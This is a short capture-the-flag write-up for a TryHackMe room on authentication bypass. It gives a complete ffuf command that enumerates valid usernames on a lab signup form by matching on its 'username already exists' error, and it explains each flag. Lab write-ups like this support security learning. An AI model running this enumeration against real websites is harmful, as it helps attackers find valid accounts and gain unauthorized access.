# Authentication Bypass

```
https://tryhackme.com/room/authenticationbypass
```

http://10.10.16.149/customers/signup

![image](https://user-images.githubusercontent.com/44063862/159839376-ecb9c3ce-fddc-4a34-bf7b-bab783a602c6.png)

When i try to create an account for "Admin", i got an error stated that username already exixts.

![image](https://user-images.githubusercontent.com/44063862/159839498-76054547-d307-4840-beef-46339deddfc9.png)

Using ffuf to 

> ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.16.149/customers/signup -mr "username already exists"

-w list of usernames
-X request method (GET request by default)
-d specifies the data that we are going to send (Ex: username, email, password and cpassword)
-H for adding additional headers to the request
-u specifies the URL we are making the request to
-mr text on the page we are looking for to validate we've found a valid username (error text)

![image](https://user-images.githubusercontent.com/44063862/159850599-dbd6e4f8-0211-4f1e-b33e-ef4126b6f1b6.png)


